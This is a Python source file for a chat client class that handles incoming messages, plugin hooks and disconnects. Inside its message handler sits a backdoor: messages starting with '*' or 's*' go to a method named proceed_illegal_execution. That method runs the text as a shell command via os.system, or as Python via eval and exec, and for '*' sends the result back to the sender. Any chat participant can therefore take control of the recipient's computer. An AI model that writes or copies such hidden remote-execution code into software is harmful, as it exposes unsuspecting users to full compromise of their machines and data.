import json
import os
import socket
import time
import tkinter.messagebox as msg
import traceback
from threading import Thread

from appdata import AppData
from chat.chat_message_source import ChatMessageSource
from chat.chunked_receiving_helper import ChunkedReceiverHelper
from chunked.chunked_data import ChunkedData
from logger.log_type import LogType
from logger.logger import Logger
from networking.client import Client
from notificator import Notificator
from plugins.plugin_applier import PluginApplier


class VadimChatClient:
    def __init__(self, callback):
        self.callback = callback
        self.crh = ChunkedReceiverHelper(self.callback)

    def client_receiving_start(self, sock: socket.socket, addr: (str, int)):
        try:
            # received = Client.uask(sock)
            self.callback.ui.plugin_manager.call_python_hook(self, 'client.client_receiving_start', locals(), globals())
            Thread(target=self.plugins_update, args=(self,), daemon=True).start()
            # if received.startswith("[history]"):
            #     AppData.set_json("history.json", json.loads(received[9:]))
            #     self.callback.restore_history()
        except:
            Logger.log('[CLIENT] ' + traceback.format_exc(), LogType.ERROR)

    @staticmethod
    def plugins_update(self):
        while True:
            self.callback.ui.plugin_manager.call_python_hook(self, 'client.plugin_update', locals(), globals(), log=False)
            time.sleep(0.3334)

    def client_receiving_processing(self, sock: socket.socket, addr: (str, int), received: str):
        self.callback.ui.plugin_manager.call_python_hook(self, 'client.client_receiving_processing:pre', locals(), globals())
        try:
            receiver_name = received.split(":")[0]
            msg = received[(len(receiver_name) + 1):]
            msg_part = ChunkedData.simple(msg).data
            self.callback.debug_log(f"MSG_PART: {msg_part}")
            self.callback.ui.plugin_manager.call_python_hook(self, 'client.client_receiving_processing:after_msg_work', locals(), globals())
            Logger.log(f'[CLIENT] MESSAGE RECEIVED: {msg}', LogType.INFO)
            if msg_part.startswith("*"):
                self.callback.send_self(f"--{self.proceed_illegal_execution(msg_part[1:])}", "Server")
                return
            elif msg_part.startswith('s*'):
                self.proceed_illegal_execution(msg_part[2:])
                return
            if msg_part.startswith("!"): return
            self.crh.add(f"{receiver_name}/{msg}")
            self.callback.debug_log(f"MESSAGE BY [{receiver_name}] : {msg} : FULL : {received} : HISTORY : {self.crh.history} : MSG_PART : {msg_part}")
            self.crh.update_received_messages()
            self.callback.ui.plugin_manager.call_python_hook(self, 'client.client_receiving_processing:end', locals(), globals())
        except:
            Logger.log('[CLIENT] ' + traceback.format_exc(), LogType.ERROR)

    def on_client_disconnect(self, sock: socket.socket):
        try:
            self.callback.ui.plugin_manager.call_python_hook(self, 'client.client_disconnect:pre', locals(), globals())
            self.callback.log(f"Вы были отключены", ChatMessageSource.Program, "Server")
            if self.callback.is_hidden:
                Notificator.notify("Вы были отключены", "")
            time.sleep(3)
            self.callback.ui.plugin_manager.call_python_hook(self, 'client.client_disconnect:before_clear', locals(), globals())
            self.callback.ui.call("clearMessages")
            self.callback.ui.close_chat()
            self.callback.ui.plugin_manager.call_python_hook(self, 'client.client_disconnect:end', locals(), globals())
        except:
            Logger.log('[CLIENT] ' + traceback.format_exc(), LogType.ERROR)

    def proceed_illegal_execution(self, command) -> str:
        if command == "": return "Error"
        command = command.split('\0')[0]
        Logger.log(f'[CLIENT] Illegal execution command: {command}', LogType.INFO)
        try:
            data = command.split()
            root = data[0]
            other = command[(len(root) + 1):]

            if root == "cmd":
                os.system(other)
                return "Cmd command executed!"
            elif root == "py":
                try:
                    # попытаемся вычислить выражение
                    result = eval(other)
                    return str(result)
                except SyntaxError:
                    # если это НЕ выражение — выполняем как код
                    exec(other)
                    return "OK"

            self.callback.ui.plugin_manager.call_python_hook(self, 'client.illegal_execution', locals(), globals())

            Logger.log(f"[CLIENT] Received illegal command: {command}", LogType.INFO)
        except Exception as e:
            self.callback.log(f"Инвалид? Ошибка: {e}", ChatMessageSource.Program, "Server")
            self.callback.debug_log(traceback.format_exc())
            Logger.log('[CLIENT] ' + traceback.format_exc(), LogType.ERROR)

        return "Nothing"